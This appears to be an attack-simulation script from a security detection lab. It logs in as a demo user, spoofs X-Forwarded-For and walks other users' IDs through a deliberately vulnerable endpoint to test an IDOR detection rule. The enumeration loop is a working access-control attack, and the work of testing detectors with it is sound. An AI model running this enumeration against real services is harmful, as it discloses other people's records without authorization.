#!/bin/bash
# 03-idor: authenticated user walks other users' IDs through the vulnerable
# GET /api/users/:id endpoint (VULN-001). Should trip RULE-003 (IDOR Detection).
set -e

DIR="$(cd "$(dirname "${BASH_SOURCE[0]:-$0}")" && pwd)"
. "$DIR/../lib.sh"

title "Attack Sim: IDOR (03)"

XFF="$(random_xff)"
log "Using source IP $XFF for this run"

echo ""
log "[1/3] Login as alice.anderson@tenant.alpha.com (user-101)..."
TOKEN=$(login "alice.anderson@tenant.alpha.com" "demo_password_123" "$XFF")
[ -n "$TOKEN" ] && ok "Logged in" || { err "Login failed"; exit 1; }

echo ""
log "[2/3] Access own record, then enumerate user-102..user-113 via the vulnerable endpoint..."
curl -s -o /dev/null -H "Authorization: Bearer $TOKEN" -H "X-Forwarded-For: $XFF" "$API/api/users/user-101"
echo "  GET /api/users/user-101 (own data) - ok"
DISCLOSED=0
for ID in 102 103 104 105 106 107 108 109 110 111 112 113; do
  CODE=$(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: Bearer $TOKEN" -H "X-Forwarded-For: $XFF" "$API/api/users/user-$ID")
  [ "$CODE" = "200" ] && DISCLOSED=$((DISCLOSED + 1))
  echo "  GET /api/users/user-$ID -> HTTP $CODE"
done
ok "$DISCLOSED/12 other users' records disclosed (IDOR confirmed, VULN-001)"

echo ""
run_detection "$XFF"
print_newest_incidents 5

echo ""
title "IDOR simulation complete (source IP $XFF)"
